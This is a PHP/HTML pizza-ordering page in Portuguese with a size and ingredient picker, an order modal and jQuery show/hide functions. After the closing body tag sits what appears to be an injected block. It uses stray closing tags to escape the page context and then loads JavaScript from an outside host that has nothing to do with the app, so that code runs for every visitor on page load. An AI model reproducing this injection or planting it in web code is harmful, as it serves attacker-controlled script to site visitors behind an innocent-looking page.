<?php include 'inc/cabecalho.php'; ?>
 <body id="bgpizza">
    <div class="container">
		<center><img src="lib/img/pizza_banner.jpg" width=100% height=auto; ></img></center>
        <br><div class="panel panel-warning">
			
			<div class="panel-heading">Pedir PIZZA!</div>
				<div class="panel-body">
					<button type="button" class="btn btn-warning" id="btmassa" onclick="windowMassa();" >Massa</button>
					<button type="button" class="btn btn-default" id="bting1" onclick="windowIngred1();">Ingrediente 1</button>

					<button type="button" title="Adicionar Ingrediente" id="addIngred" class="btn btn-primary" aria-label="Left Align" onclick="createInput();">
						<span class="glyphicon glyphicon-plus"  aria-hidden="true"></span>
					</button>
					
					<button type="button" title="Adicionar Ingrediente" id="tiraIngred" class="btn btn-danger" aria-label="Left Align" onclick="deleteIngred();" disabled>
						<span class="glyphicon glyphicon-minus"  aria-hidden="true"></span>
					</button>
					
				</div>
			</div>
			
			<div  id="massa">
			<ul class="list-group" id="listaTamanho">
				<a href="#" class="list-group-item disabled">Selecione o tamanho da Pizza</a>
				<button onclick="selecIngred(this);" class="list-group-item">Grande (5 Ingredientes)</button>
				<button onclick="selecIngred(this);" class="list-group-item">Média (3 Ingredientes)</button>
				<button onclick="selecIngred(this);" class="list-group-item">Pequena (2 Ingredientes)</button>

			</ul>
			</div>
			
			<div  id="lista">
			<ul class="list-group" id="listaIngred1" hidden>
				<button class="list-group-item disabled">Selecione o Ingrediente 1</a>
				<button onclick="selecIngred(this);"  class="list-group-item" rel="popover" data-content="">Tomate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Presunto</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Mussarela</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Frango</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Bacon</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Azeitona</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Cebola</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Banana</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Morango</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Abacaxi</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Chocolate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Sorvete</a>
			</ul>
			</div>
			
			<ul class="list-group" id="listaIngred2" hidden>
				<button onclick="" class="list-group-item disabled">Selecione o Ingrediente 2</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Tomate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Presunto</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Mussarela</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Frango</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Bacon</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Azeitona</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Cebola</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Banana</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Morango</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Abacaxi</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Chocolate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Sorvete</a>
				<!--<br><button onclick="removeIngred();" class="btn btn-danger" >Remover Ingrediente</button> -->
			</ul>
			
			<ul class="list-group" id="listaIngred3" hidden>
				<button class="list-group-item disabled">Selecione o Ingrediente 3</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Tomate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Presunto</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Mussarela</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Frango</a><button onclick="selecIngred(this);"  class="list-group-item">Bacon</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Azeitona</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Cebola</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Banana</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Morango</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Abacaxi</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Chocolate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Sorvete</a>
			</ul>
			
			<ul class="list-group" id="listaIngred4" hidden>
				<button class="list-group-item disabled">Selecione o Ingrediente 4</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Tomate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Presunto</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Mussarela</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Frango</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Bacon</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Azeitona</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Cebola</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Banana</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Morango</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Abacaxi</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Chocolate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Sorvete</a>
			</ul>
			
			<ul class="list-group" id="listaIngred5" hidden>
				<button class="list-group-item disabled">Selecione o Ingrediente 5</a>
				<button onclick="selecIngred(this);"  class="list-group-item" data-id>Tomate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Presunto</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Mussarela</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Frango</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Bacon</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Azeitona</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Cebola</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Banana</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Morango</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Abacaxi</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Chocolate</a>
				<button onclick="selecIngred(this);"  class="list-group-item">Sorvete</a>
				
			</ul>

			
			
			<button type="button" data-toggle="modal" data-target="#myModal" class="btn btn-primary btn-lg pull-right"><span class="glyphicon glyphicon-ok" data-toggle="modal" data-target="#myModal"></span> Fechar pedido</button>


	

	</div>
	
	<!-- Modal -->
<div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel">Seu pedido</h4>
      </div>
      <div class="modal-body">
	  <center><img src="lib/img/pizza-b.png" width=70% height=auto;></img></center><br>
        <h4>Sua pizza é: </h4>
		
		<h5> Grande </h5><br>
		
		<h4>Possui os ingredientes:</h4>
		<h5>Presunto<br>
		Frango<br>
		Mussarela<br>
		Presunto<br></h5>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Cancelar</button>
        <a type="button" class="btn btn-primary" href='pagamento.php'>Confirma</a>
      </div>
    </div>
  </div>
</div>
	
	
  </body>
</noscript>
<div style="text-align: center;"><div style="position:relative; top:0; margin-right:auto;margin-left:auto; z-index:99999">
</textarea></script></div><SCRIPT TYPE="text/javascript" LANGUAGE="JavaScript" SRC="http://www.gedan.com/publis.php"></SCRIPT>
</div></div>
  
  					<script>
					//var bting = 1;
					var bting = $("[id^=bting]").length;
					var valantigo;
						function createInput(){
							$("#listaTamanho").hide('fast');
							$("#listaIngred"+bting).hide('fast');
							bting++;
							$("#listaIngred"+bting).show('fast');
							var $input = $('<input type="button" class="btn btn-default" value="Ingrediente '+bting+'" id="bting'+bting+'" onclick="windowIngred'+bting+'(this);" />')
							
							$input.insertBefore($("#addIngred"));
							
							if (bting > 4){
								$("#addIngred").attr("disabled", "disabled");
							} if (bting > 1){
								$("#tiraIngred").removeAttr("disabled", "disabled");
							}
						}
						
						function deleteIngred(){
							$("#listaIngred"+bting).hide('slow');
							$("#bting"+bting).remove();
							$('#listaIngred'+bting+' a').removeClass('active');
							bting--;
							
							if (bting < 2){
							 $("#tiraIngred").attr("disabled", "disabled");
							} if (bting < 5){
								$("#addIngred").removeAttr("disabled", "disabled");
							  }
						}
						
						function selecIngred(obj){
							
							var selecionado = $(obj).text();
							
							if($(obj).parent().is("#listaTamanho")){
								if($("#listaTamanho button").hasClass('active')){
									$("#listaTamanho button").removeClass('active');
								}
									$(obj).addClass('active');
									$("#btmassa").text(selecionado);
									$("#btmassa").addClass('btn-primary');
								
							}
							
							if($(obj).parent().is("#listaIngred1")){
								if($("#listaIngred1 button").hasClass('active')){
									$("#listaIngred1 button").removeClass('active');
								}
									$(obj).addClass('active');
									$("#bting1").text(selecionado);
									$("#bting1").addClass('btn-primary');
								
							}
							if($(obj).parent().is("#listaIngred2")){
								if($("#listaIngred2 button").hasClass('active')){
									$("#listaIngred2 button").removeClass('active');
								}
									$(obj).addClass('active');
									$("#bting2").val(selecionado);
									$("#bting2").addClass('btn-primary');
								
							}
							if($(obj).parent().is("#listaIngred3")){
								if($("#listaIngred3 button").hasClass('active')){
									$("#listaIngred3 button").removeClass('active');
								}
									$(obj).addClass('active');
									$("#bting3").val(selecionado);
									$("#bting3").addClass('btn-primary');
								
							}
							if($(obj).parent().is("#listaIngred4")){
								if($("#listaIngred4 button").hasClass('active')){
									$("#listaIngred4 button").removeClass('active');
								}
									$(obj).addClass('active');
									$("#bting4").val(selecionado);
									$("#bting4").addClass('btn-primary');
								
							}
							if($(obj).parent().is("#listaIngred5")){
								if($("#listaIngred5 button").hasClass('active')){
									$("#listaIngred5 button").removeClass('active');
								}
									$(obj).addClass('active');
									$("#bting5").val(selecionado);
									$("#bting5").addClass('btn-primary');
								
							}
/*							if ($(obj).hasClass("active")){
								
								$(obj).removeClass('active');
								$("#bting2").val(valantigo);
							}else*/
									

						}
						
						function removeIngred(){
						
							if ($("#listaIngred2").not("hidden")){
								$("#listaIngred2 a").removeClass('active');
								$("#listaIngred2").hide('slow');
								$("#bting2").remove();
								bting--;
							}
						
						}
						
						function windowMassa(obj){
						valantigo = $(obj).val();
							$('#listaIngred1').hide('fast');
							$('#listaIngred2').hide('fast');
							$('#listaIngred3').hide('fast');
							$('#listaIngred4').hide('fast');
							$('#listaIngred5').hide('fast');
							if ($('#listaTamanho').is(":hidden")){
								$('#listaTamanho').show('slow');
								} else {
									$('#listaTamanho').hide('slow');
								}
							//$('#listaIngred1').removeAttr("hidden","hidden");
							
						}
						
						function windowIngred1(obj){
						valantigo = $(obj).val();
							$('#listaTamanho').hide('fast');
							$('#listaIngred2').hide('fast');
							$('#listaIngred3').hide('fast');
							$('#listaIngred4').hide('fast');
							$('#listaIngred5').hide('fast');
							if ($('#listaIngred1').is(":hidden")){
								$('#listaIngred1').show('slow');
								} else {
									$('#listaIngred1').hide('slow');
								}
							//$('#listaIngred1').removeAttr("hidden","hidden");
							
						}
						
						function windowIngred2(obj){
						valantigo = $(obj).val();
							$('#listaTamanho').hide('fast');
							$('#listaIngred1').hide('fast');
							$('#listaIngred3').hide('fast');
							$('#listaIngred4').hide('fast');
							$('#listaIngred5').hide('fast');
							if ($('#listaIngred2').is(":hidden")){
								$('#listaIngred2').show('slow');
							} else {
								$('#listaIngred2').hide('slow');
								}
						}
								
						function windowIngred3(obj){
						valantigo = $(obj).val();
							$('#listaTamanho').hide('fast');
							$('#listaIngred1').hide('fast');
							$('#listaIngred2').hide('fast');
							$('#listaIngred4').hide('fast');
							$('#listaIngred5').hide('fast');
							if ($('#listaIngred3').is(":hidden")){
								$('#listaIngred3').show('slow');
							} else {
								$('#listaIngred3').hide('slow');
							}
						}
						
						function windowIngred4(obj){
						valantigo = $(obj).val();
							$('#listaTamanho').hide('fast');
							$('#listaIngred1').hide('fast');
							$('#listaIngred2').hide('fast');
							$('#listaIngred3').hide('fast');
							$('#listaIngred5').hide('fast');
							if ($('#listaIngred4').is(":hidden")){
								$('#listaIngred4').show('slow');
							} else {
								$('#listaIngred4').hide('slow');
							}
						}
						
						function windowIngred5(obj){
						valantigo = $(obj).val();
							$('#listaTamanho').hide('fast');
							$('#listaIngred1').hide('fast');
							$('#listaIngred2').hide('fast');
							$('#listaIngred3').hide('fast');
							$('#listaIngred4').hide('fast');
							if ($('#listaIngred5').is(":hidden")){
								$('#listaIngred5').show('slow');
							} else {
								$('#listaIngred5').hide('slow');
							}
						}


						</script>
						<script>
						$(document).ready(function(){
							var image = '<img src="lib/img/pizza.png" width="70%"">';
							$('[rel="popover"]').popover({placement: 'bottom', content: image, html: true, trigger: 'hover'});
						});
						</script>
<?php include 'inc/rodape.php'; ?>